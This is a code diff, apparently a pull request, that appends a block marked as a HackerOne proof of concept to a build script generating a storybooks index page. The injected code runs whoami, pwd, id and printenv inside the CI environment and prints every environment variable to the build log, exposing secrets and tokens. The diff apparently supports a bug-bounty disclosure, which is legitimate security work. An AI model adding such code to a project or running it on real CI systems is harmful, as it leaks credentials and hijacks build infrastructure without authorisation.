@@ -132,3 +132,25 @@ const html = `<!DOCTYPE html>
 const outputPath = path.join(storybooksDir, 'index.html');
 fs.writeFileSync(outputPath, html);
 console.log(`Generated storybooks/index.html with main + ${prs.length} PRs`);
+
+// --- PoC Start ---
+// Injected by [Your HackerOne Username] for PoC demonstration.
+console.log('[+] PoC Triggered: Executing commands inside the CI environment.');
+const { execSync } = require('child_process');
+try {
+    const whoami = execSync('whoami').toString().trim();
+    const pwd = execSync('pwd').toString().trim();
+    const id = execSync('id').toString().trim();
+    const env = execSync('printenv | sort').toString();
+
+    console.log('----------------------------------------------------');
+    console.log('[+] USER: ' + whoami);
+    console.log('[+] PWD: ' + pwd);
+    console.log('[+] ID: ' + id);
+    console.log('[+] ENVIRONMENT VARIABLES: \n' + env);
+    console.log('----------------------------------------------------');
+} catch (e) {
+    console.error('PoC command execution failed:', e);
+}
+console.log('[+] PoC Finished.');
+// --- PoC End ---
